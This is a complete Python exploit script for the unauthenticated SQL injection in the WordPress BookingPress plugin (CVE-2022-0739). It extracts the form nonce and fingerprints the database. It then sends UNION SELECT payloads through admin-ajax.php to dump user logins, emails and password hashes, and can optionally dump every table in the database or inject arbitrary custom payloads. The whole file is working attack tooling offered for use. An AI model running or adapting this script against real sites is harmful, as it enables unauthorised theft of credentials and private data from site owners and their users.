#!/usr/bin/env python3

import re
import requests
import validators
from json import loads, dumps
from random import randint
from argparse import ArgumentParser
from rich import print_json
from alive_progress import alive_bar



#########################
# [ PRINTING UTILITIES] #
#########################

GLOBAL_COLORS = True

class Colors:
    ansi_reset = '\033[0m'
    ansi_red = '\033[91m'
    ansi_green = '\033[92m'
    ansi_yellow = '\033[93m'
    ansi_blue = '\033[94m'

    @classmethod
    def red(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_red}{msg}{cls.ansi_reset}"
        return msg

    @classmethod
    def green(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_green}{msg}{cls.ansi_reset}"
        return msg

    @classmethod
    def yellow(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_yellow}{msg}{cls.ansi_reset}"
        return msg

    @classmethod
    def blue(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_blue}{msg}{cls.ansi_reset}"
        return msg

def print_success(msg):
    print(Colors.green(f"[+] {msg}"))

def print_warning(msg):
    print(Colors.yellow(f"[!] {msg}"))

def print_error(msg):
    print(Colors.red(f"[-] {msg}"))

def print_info(msg):
    print(Colors.blue(f"[*] {msg}"))

def print_verbose(msg):
    print(f"[V] {msg}")

def print_banner():
    print("""
████████████████████████████████████████████████████████████████████
█─▄▄▄▄█─▄▄▄─█▄─▄█████▄─▄█▄─▀█▄─▄███▄─▄█▄─▄▄─█─▄▄▄─█─▄─▄─█─▄▄─█▄─▄▄▀█
█▄▄▄▄─█─██▀─██─██▀████─███─█▄▀─██─▄█─███─▄█▀█─███▀███─███─██─██─▄─▄█
▀▄▄▄▄▄▀───▄▄▀▄▄▄▄▄▀▀▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀
====================================================================
             █▀▀ █░█ █▀▀ ▄▄ ▀█ █▀█ ▀█ ▀█ ▄▄ █▀█ ▀▀█ █▀█
             █▄▄ ▀▄▀ ██▄ ░░ █▄ █▄█ █▄ █▄ ░░ █▄█ ░░█ ▀▀█
    """)

#########################

class SQLInjector:
    def __init__(self, args: ArgumentParser, pool: requests.Session):
        self.pool = pool
        self.v_url = f"{args.url}/wp-admin/admin-ajax.php"
        self.outfile = args.basename
        self.custom_payload = args.payload
        self.verb = args.verb
        self.nonce = args.nonce
        if not self.nonce: self.nonce = self.extract_nonce(args.nonce_url)
        self.user_dict = dict()
        self.db_schema = dict()
        self.db_dump = dict()
        self.trigger = ') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -'
        self.gainer = ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -'
        self.schema = ') UNION ALL SELECT @@VERSION,table_schema,table_name,NULL,JSON_ARRAYAGG(column_name),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS GROUP BY table_name-- -'
        
    
    def extract_nonce(self, nonce_url):
        match = re.search(r"_wpnonce:'(\w+)'", requests.get(nonce_url).text)
        if match: return match.group(1)
        print_error(f"Could not fetch any nonce from {nonce_url}")
        exit(-1)

    # sql_postfix: ") AND ... -- - total(9)"
    def gen_payload(self, sqli_postfix, category_id=1):
        # Generate and return the payload (whole request body)
        return { 
            'action': 'bookingpress_front_get_category_services', # vulnerable action,
            '_wpnonce': self.nonce,
            'category_id': category_id,
            'total_service': f'{randint(100, 10000)}{sqli_postfix}'
        }
    
    def fire_payload(self, payload, category_id=1) -> list:
        # Fire the given payload against bookingpress vulnerable action, raises exceptions if bad response from server
        req_body = self.gen_payload(payload, category_id)
        if self.verb: print_verbose("REQUEST BODY =>\n" + str(req_body))
        res = self.pool.post(self.v_url, req_body)
        res_text = res.text
        if self.verb: print_verbose("RESPONSE <=\n" + str(res_text))
        res.raise_for_status()
        if not res_text: 
            print_warning("Got empty response")
            res_text = '[]'
        return [list(r.values()) for r in list(loads(res_text))]
    
    def check_endpoint(self) -> bool:
        # Check the given endpoint is vulnerable
        try:
            res = self.fire_payload(self.trigger)
            if len(res) > 1: 
                print_warning(f"More than 1 row returned from Vulnerability Discovery query, that's weird.")
                print_json(data=res)
            self.user_count = int(res[0][7])
            self.db_signature = res[0][0]
            print_info(f"DB Fingerprint: {self.db_signature}")
            print_info(f"Users found: {self.user_count}")
            return True
        except Exception as e:
            print_error(f"Exception: {e}")
            print_error(f"Invalid response returned, could not fetch user count.")
            return False
    
    def dump_users(self):   
        try:
            res = self.fire_payload(self.gainer)
            if len(res) != self.user_count: print_warning(f"Got {len(res)} rows while previously {self.user_count} were discovered, that's weird.")
            for u_data in res:
                self.user_dict[u_data[0]] = {'email': u_data[1], 'password': u_data[2]}
            print_json(data=self.user_dict)
        except Exception as e: 
            print_error(f"Exception: {e}")
            print_error(f"Error dumping users")

    def dump_all(self):
        res = self.fire_payload(self.schema)
        with alive_bar(len(res), enrich_print=False, theme='classic') as pbar:
            for db_table_dump in res:
                db_name = db_table_dump[1]
                table_name = db_table_dump[2]
                cols = db_table_dump[4]
                if not self.db_schema.get(db_name):
                    self.db_schema[db_name] = dict()
                    self.db_dump[db_name] = dict()
                self.db_schema[db_name][table_name] = loads(cols)
                # Build table dumping payload
                print_info(f"Dumping {db_name}.{table_name}")
                try:
                    table_payload = f") UNION ALL SELECT NULL,CONCAT({',CHAR(126),'.join(loads(cols))}),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM {db_name}.{table_name}-- -"
                    table_rows = self.fire_payload(table_payload)
                    for exfltr_row in table_rows:
                        if not exfltr_row[1]: continue
                        json_row = dict()
                        for k, v in zip(loads(cols), exfltr_row[1].split('~')):
                            json_row[k] = v
                        if self.verb: print_verbose(json_row)
                        if not self.db_dump[db_name].get(table_name): self.db_dump[db_name][table_name] = list()
                        self.db_dump[db_name][table_name].append(json_row)
                except Exception as e:
                    print_error(f"Exception: {e}")
                    print_error(f"Failed processing {db_name}.{table_name}")
                    print_warning(f"Payload used: '{table_payload}'")
                finally:
                    pbar()
        if self.verb or not self.outfile: 
            print_success("DATABASE SCHEMA:")
            print_json(data=self.db_schema)
            print_success("DATABASE DUMP:")
            print_json(data=self.db_dump)
        if self.outfile:
            with open(self.outfile + '-schema.json', 'w') as of:
                of.write(dumps(self.db_schema))
            with open(self.outfile + '.json', 'w') as of:
                of.write(dumps(self.db_dump))

def can_write_to_file(filename):
    try:
        f = open(filename + '.json', 'w')
        f.close()
        f = open(filename + '-schema.json', 'w')
        f.close()
        return True
    except IOError:
        return False

def init_params():
    p = ArgumentParser()
    p.add_argument('-u', '--url', dest='url', help='URL of WordPress server with vulnerable plugin (http://example.domain)', required=True)
    p.add_argument('-o', '--out', dest='basename', help='Output database schema and dump in JSON format')
    p.add_argument('-p', '--payload', dest='payload', help='Payload to inject. Should start with \')\'')
    p.add_argument('-a', '--dump-all', dest='dumpall', help='Enables whole DB dump', action='store_true')
    p.add_argument('-v', '--verbose', dest='verb', help='Enables verbose mode', action='store_true')
    group = p.add_mutually_exclusive_group(required=True)
    group.add_argument('-n', '--nonce', dest='nonce', help='Nonce that you got as unauthenticated user')
    group.add_argument('-nu', '--nonce-url', dest='nonce_url', help='URL where nonce can be extracted (bookingprss form page)')
    
    args = p.parse_args()

    # Validate given parameters
    if args.payload[0] != ')': print_warning("Your payload seems not to start with ')'. Sure you know what you're doing?")
    if not validators.url(args.url) or (args.nonce_url and not validators.url(args.nonce_url)): 
        print_error(f"Invalid URL given: {args.url}")
        exit(-1)
    if args.basename and not can_write_to_file(args.basename):
        print_error(f"Could not open {args.basename} for writing")
        exit(-1)

    return (args, requests.session())
    
if __name__ == '__main__':  
    print_banner()
    args, pool = init_params()
    sqli = SQLInjector(args, pool)
    
    if not sqli.check_endpoint():
        print_error(f"Endpoint looks solid :')")
        exit(-1)
    
    sqli.dump_users()    
    if args.dumpall: sqli.dump_all()

    print_json(data=sqli.fire_payload(args.payload))